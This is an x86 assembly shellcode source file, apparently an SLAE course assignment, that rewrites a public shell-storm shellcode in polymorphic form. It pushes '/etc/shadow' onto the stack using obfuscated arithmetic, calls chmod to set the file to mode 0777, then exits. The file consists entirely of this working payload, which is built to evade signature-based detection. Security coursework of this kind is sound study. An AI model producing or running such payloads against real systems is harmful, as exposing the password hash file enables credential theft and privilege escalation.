;#SLAE Assignment #06: Polymorphism
;#Polymorphic Version of hellcode from: http://shell-storm.org/shellcode/files/shellcode-590.php
;#AUTHOR: SLAE-1262

section .text
global _start

_start: ;Polymorphic Version    
	mov eax, 0x01FFFFFF	
	and eax, 0x02776f64	;eax=0x00776f64
	push eax
	add eax, 0x60f103cb	;eax=0x6168732f
	push eax	
	add eax, 0x9E978CE0	;eax=15 -> chmod
	push 0x6374652f;
	mov ebx,esp
	mov ecx,eax		;ecx=15
	add cx, 0x1f0		;ecx=777_8	
	int 0x80		;run chmod
	inc eax			;eax=1 if retval=0
	int 0x80		;exit
	
